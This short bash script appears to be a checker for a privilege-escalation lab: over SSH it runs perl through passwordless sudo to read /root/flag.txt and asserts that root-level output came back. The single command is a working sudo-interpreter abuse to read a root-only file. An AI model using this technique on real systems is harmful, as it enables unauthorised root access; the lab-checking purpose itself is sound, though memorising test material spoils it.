#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'sudo -n /usr/bin/perl -e "print open(F,\"/root/flag.txt\") ? do{local $/; <F>} : \"\""')"
assert_root_output "${out}"
